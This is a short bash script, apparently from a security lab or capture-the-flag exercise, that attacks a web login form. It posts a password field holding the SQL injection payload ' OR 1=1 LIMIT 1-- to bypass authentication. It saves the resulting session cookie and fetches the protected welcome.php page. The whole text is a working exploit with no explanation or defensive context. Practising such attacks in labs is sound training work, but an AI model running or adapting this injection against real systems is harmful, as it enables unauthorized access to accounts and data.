#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
curl -s -m 20 -c /tmp/cj6.txt -o /dev/null \
  --data-urlencode "username=a" --data-urlencode "password=' OR 1=1 LIMIT 1-- " "$B/"
echo "=== welcome.php ==="
curl -s -m 20 -b /tmp/cj6.txt "$B/welcome.php" | head -70
